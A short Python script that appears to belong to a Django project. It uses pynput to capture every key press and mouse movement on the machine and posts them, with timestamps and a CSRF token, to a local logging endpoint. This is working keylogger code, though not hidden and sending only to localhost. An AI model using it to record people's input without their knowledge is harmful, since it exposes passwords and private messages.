import requests
from pynput import keyboard, mouse
import time

# Backend URL for logging
BACKEND_URL = "http://127.0.0.1:8000/log-keystroke/"

# Create a session to maintain cookies
session = requests.Session()

# Step 1: Retrieve the CSRF token
# This can be done by making an initial request to your Django application (for example, the home page or login page)
response = session.get("http://127.0.0.1:8000/")  # Adjust the URL if needed
csrf_token = session.cookies.get('csrftoken')  # Get the CSRF token from the session cookies

# Step 2: Set the headers for subsequent requests
headers = {
    "X-CSRFToken": csrf_token
}

def on_press(key):
    try:
        key_data = {'user': 'Anonymous', 'key': str(key), 'timestamp': time.time()}
        session.post(BACKEND_URL, json=key_data, headers=headers)  # Add CSRF token to the headers
    except Exception as e:
        print(f"Error sending key data: {e}")

def on_move(x, y):
    try:
        mouse_data = {'user': 'Anonymous', 'x_position': x, 'y_position': y, 'timestamp': time.time()}
        session.post(BACKEND_URL, json=mouse_data, headers=headers)  # Add CSRF token to the headers
    except Exception as e:
        print(f"Error sending mouse data: {e}")

# Set up listeners
keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_move=on_move)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()

